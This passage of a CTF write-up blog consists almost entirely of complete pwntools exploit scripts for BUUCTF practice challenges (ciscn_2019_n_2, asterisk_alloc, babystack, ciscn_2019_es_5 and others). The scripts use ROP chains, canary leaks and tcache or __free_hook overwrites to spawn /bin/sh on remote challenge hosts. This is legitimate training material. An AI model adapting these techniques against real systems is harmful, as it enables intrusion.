class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.binary &#x3D; &quot;ciscn_2019_en_1&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_en_1&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_en_1&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	pop_r3_pc &#x3D; 0x000103a4</span><br><span class="line">	pop_r4_pc &#x3D; 0x000104f8</span><br><span class="line">	pop_r4_2_r10_pc_ret &#x3D; 0x00010638</span><br><span class="line">	printf_got &#x3D; 0x00021010</span><br><span class="line">	offset &#x3D; 36</span><br><span class="line">	fmt &#x3D; 0x00010660</span><br><span class="line">	call_gadget &#x3D; 0x0001061C</span><br><span class="line">	payload &#x3D; offset * &#39;a&#39;</span><br><span class="line">	payload +&#x3D; p32(pop_r4_2_r10_pc_ret)</span><br><span class="line">	payload +&#x3D; p32(0)#r4</span><br><span class="line">	payload +&#x3D; p32(printf_got)#r5</span><br><span class="line">	payload +&#x3D; p32(0)#r6</span><br><span class="line">	payload +&#x3D; p32(fmt)#r7</span><br><span class="line">	payload +&#x3D; p32(printf_got)#r8</span><br><span class="line">	payload +&#x3D; p32(0)#r9</span><br><span class="line">	payload +&#x3D; p32(0)#r10</span><br><span class="line">	payload +&#x3D; p32(call_gadget)</span><br><span class="line">	payload +&#x3D; p32(0x00010590)*10</span><br><span class="line">	sh.sendafter(&quot;:&quot;,payload)</span><br><span class="line">	sh.recvuntil(&quot;hello&quot;)</span><br><span class="line">	sh.recvuntil(&quot;hello &quot;)</span><br><span class="line">	printf &#x3D; u32(sh.recv(4))</span><br><span class="line">	libc_r0_ret &#x3D; 0x0010dc84</span><br><span class="line">	libc &#x3D; printf - lib.symbols[&#39;printf&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	payload &#x3D; offset * &#39;a&#39;</span><br><span class="line">	payload +&#x3D; p32(libc + libc_r0_ret) + p32(binsh) + p32(system)</span><br><span class="line">	sh.sendafter(&quot;:&quot;,payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28562,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x63-ciscn-2019-n-2">0x63 ciscn_2019_n_2</h2>
<h3 id="Ubuntu-18-04-3">Ubuntu 18.04</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_n_2&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def addUser(name,age):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;name:&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil(&quot;age:&quot;)</span><br><span class="line">	sh.send(str(age))</span><br><span class="line">	sh.recvuntil(&quot;idx: &quot;)</span><br><span class="line">	return int(sh.recv(1),10)</span><br><span class="line">def deleteUser(idx):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def editUser(idx,name,age):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;name:&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil(&quot;age:&quot;)</span><br><span class="line">	sh.send(str(age))</span><br><span class="line">def addMoney(idx):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;5&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def buyGift(idx,addr,size):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;6&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;input the address you want to leak:&quot;)</span><br><span class="line">	sh.sendline(hex(addr))</span><br><span class="line">	sh.recvuntil(&quot;input the size you want to leak:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">def showUser(idx):</span><br><span class="line">	sh.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_n_2&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	chunk_list &#x3D; 0x602060</span><br><span class="line">	heap_base &#x3D; 0x603000</span><br><span class="line">	addUser(&#39;\x11&#39; * 8,0x10)</span><br><span class="line">	deleteUser(0)</span><br><span class="line">	deleteUser(0)</span><br><span class="line">	addUser(p64(chunk_list),heap_base)</span><br><span class="line">	addUser(p64(chunk_list),heap_base)</span><br><span class="line">	addUser(p64(0x602070 + 8),0x603250)</span><br><span class="line">	buyGift(0,elf.got[&#39;__libc_start_main&#39;],8)</span><br><span class="line">	__libc_start_main &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	editUser(2,p64(binsh),__free_hook)</span><br><span class="line">	editUser(1,p64(system),1)</span><br><span class="line">	deleteUser(0)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28334,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x64-TWCTF-online-2019-asterisk-alloc">0x64 TWCTF_online_2019_asterisk_alloc</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.binary &#x3D; &quot;TWCTF_online_2019_asterisk_alloc&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;TWCTF_online_2019_asterisk_alloc&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def malloc(size,content):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice: &quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;Size:&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;Data:&quot;,content)</span><br><span class="line">def calloc(size,content):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice: &quot;,&quot;2&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;Size:&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;Data:&quot;,content)</span><br><span class="line">def realloc(size,content):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice: &quot;,&quot;3&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;Size:&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;Data:&quot;,content)</span><br><span class="line">def free(index):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;Which: &quot;,str(index))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;TWCTF_online_2019_asterisk_alloc&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;libc-2.27.so&quot;)</span><br><span class="line">    realloc(0x88,&#39;\n&#39;)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x68,&#39;\n&#39;)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x88,&#39;aaaaaaa&#39;)</span><br><span class="line">    offset &#x3D; lib.symbols[&#39;_IO_2_1_stdout_&#39;] % 0x10000</span><br><span class="line">    for i in range(7):</span><br><span class="line">        free(&quot;r&quot;)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x58,p16(offset))</span><br><span class="line">    calloc(0x28,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">    malloc(0x88,p16(offset))</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x88,p64(0xfbad1800) + p64(0) * 3 + &quot;\x00&quot;)</span><br><span class="line">    sh.recvuntil(p64(0xfbad1800) + p64(0) * 3)</span><br><span class="line">    libc &#x3D; u64(sh.recv(8)) - lib.symbols[&#39;_IO_2_1_stdout_&#39;] + 0x60</span><br><span class="line">    __free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">    system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">    free(&quot;m&quot;)</span><br><span class="line">    realloc(-1,&#39;&#39;)</span><br><span class="line">    realloc(0x58,p64(__free_hook))</span><br><span class="line">    realloc(-1,&#39;&#39;)</span><br><span class="line">    realloc(0x58,p64(__free_hook))</span><br><span class="line">    realloc(-1,&#39;&#39;)</span><br><span class="line">    realloc(0x58,p64(system))</span><br><span class="line">    free(&quot;c&quot;)</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28993,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x65-other-babystack">0x65 other_babystack</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">binary_file      &#x3D; b&#39;babystack&#39;</span><br><span class="line">remote_libc_file &#x3D; b&#39;libc-2.23.so&#39;</span><br><span class="line">remote_ip        &#x3D; b&#39;node3.buuoj.cn&#39;</span><br><span class="line">local_libc_file  &#x3D; b&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">remote_port      &#x3D; 28676</span><br><span class="line">context.binary   &#x3D; binary_file</span><br><span class="line">context.terminal &#x3D; [b&#39;tmux&#39;, b&#39;sp&#39;, b&#39;-h&#39;]</span><br><span class="line">def exploit(sh,awd &#x3D; False):</span><br><span class="line">        def debug(gdb_script):</span><br><span class="line">                gdb.attach(sh,gdb_script)</span><br><span class="line">        global binary_file,remote_libc_file,remote_ip,remote_port</span><br><span class="line">        elf &#x3D; context.binary</span><br><span class="line">        if(remote &#x3D;&#x3D; True):</span><br><span class="line">                lib &#x3D; ELF(remote_libc_file) if remote_libc_file !&#x3D; b&#39;&#39; else &quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">                lib &#x3D; elf.libc if local_libc_file &#x3D;&#x3D; b&quot;&quot; else ELF(local_libc_file)</span><br><span class="line">        if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">                pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">                pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">        elif context.arch &#x3D;&#x3D; b&quot;i386&quot;:</span><br><span class="line">                pop_ebp_ret &#x3D; elf.search(asm(b&quot;pop ebp ; ret&quot;)).next()</span><br><span class="line">                pop3_ret    &#x3D; elf.search(asm(b&quot;pop esi ; pop edi ; pop ebp ; ret&quot;)).next()</span><br><span class="line">        s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">        sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">        sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">        sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">        r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">        ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">        irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">        uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">        uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">        ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">        ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">        lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">        sla(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">        s(&#39;a&#39; * (0x88 + 1))</span><br><span class="line">        sla(&quot;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">        ru(0x88 * &quot;a&quot;)</span><br><span class="line">        canary &#x3D; uu64(r(8))</span><br><span class="line">        canary -&#x3D; 0x61</span><br><span class="line">        sla(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">        payload &#x3D; &#39;a&#39; * 0x88</span><br><span class="line">        payload +&#x3D; p64(canary)</span><br><span class="line">        payload +&#x3D; &#39;a&#39; * 0x8</span><br><span class="line">        payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">        payload +&#x3D; p64(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">        payload +&#x3D; p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">        payload +&#x3D; p64(0x0000000000400908)</span><br><span class="line">        s(payload)</span><br><span class="line">        sla(&quot;&gt;&gt;&quot;,&quot;3&quot;)</span><br><span class="line">        __libc_start_main &#x3D; ru7f()</span><br><span class="line">        libc &#x3D; __libc_start_main - lib.symbols[b&#39;__libc_start_main&#39;]</span><br><span class="line">        lib.address &#x3D; libc</span><br><span class="line">        system &#x3D; lib.symbols[b&#39;system&#39;]</span><br><span class="line">        binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">        __free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]</span><br><span class="line">        __malloc_hook &#x3D; lib.symbols[b&#39;__malloc_hook&#39;]</span><br><span class="line">        __realloc_hook &#x3D; lib.symbols[b&#39;__realloc_hook&#39;]</span><br><span class="line">        one_gadget &#x3D; []</span><br><span class="line">        sla(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">        payload &#x3D; &#39;a&#39; * 0x88</span><br><span class="line">        payload +&#x3D; p64(canary)</span><br><span class="line">        payload +&#x3D; &#39;a&#39; * 0x8</span><br><span class="line">        payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">        payload +&#x3D; p64(binsh)</span><br><span class="line">        payload +&#x3D; p64(system)</span><br><span class="line">        s(payload)</span><br><span class="line">        sla(&quot;&gt;&gt;&quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">        if awd !&#x3D; True:</span><br><span class="line">                irt()</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">        exploit(remote(remote_ip,remote_port),remote &#x3D; True)</span><br></pre></td></tr></table></figure>
<h2 id="0x66-ciscn-2019-es-5">0x66 ciscn_2019_es_5</h2>
<h3 id="0堆块和realloc函数之间的冲突导致double-free">0堆块和realloc函数之间的冲突导致double free</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_es_5&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def add(size,content):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;&gt;&quot;,str(size))</span><br><span class="line">    if(size !&#x3D; 0):</span><br><span class="line">        sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;2&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">    if(content !&#x3D; &#39;&#39;):</span><br><span class="line">        sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;3&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;ciscn_2019_es_5&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    add(0x0,&#39;&#39;)</span><br><span class="line">    add(0xb0,&#39;\n&#39;)</span><br><span class="line">    edit(0,&#39;&#39;)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0x18,&#39;a&#39;)</span><br><span class="line">    show(0)</span><br><span class="line">    sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    heap_base &#x3D; (u64(sh.recvuntil(&quot;\n&quot;,True).ljust(8,&#39;\x00&#39;)) &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">    edit(0,p64(heap_base + 0xa0))</span><br><span class="line">    add(0x18,p64(heap_base + 0x10))</span><br><span class="line">    payload &#x3D; p64(0xfcfcfcfcfcfcfcfc) * 8 + p64(0) * ((0xb0 - 0x58) &#x2F; 8) + p64(heap_base+0x10)</span><br><span class="line">    add(0xb0,payload)</span><br><span class="line">    free(1)</span><br><span class="line">    add(0x0,&#39;&#39;)</span><br><span class="line">    show(1)</span><br><span class="line">    libc &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;,False)[-6:].ljust(8,&#39;\x00&#39;)) - 96 - lib.symbols[&#39;__malloc_hook&#39;] - 0xc0</span><br><span class="line">    __free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">    system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">    payload &#x3D; p64(0xfcfcfcfcfcfcfcfc) * 8 + p64(0) * ((0xb0 - 0x58) &#x2F; 8) + p64(__free_hook) + p64(__free_hook + 8)</span><br><span class="line">    add(0xc0,payload)</span><br><span class="line">    add(0xc0,p64(system))</span><br><span class="line">    add(0xd0,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">    free(6)</span><br><span class="line">    log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">    log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">    log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">    log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        log.success(&quot;pid: &quot; + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28899,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x67-roarctf-2019-realloc-magic">0x67 roarctf_2019_realloc_magic</h2>
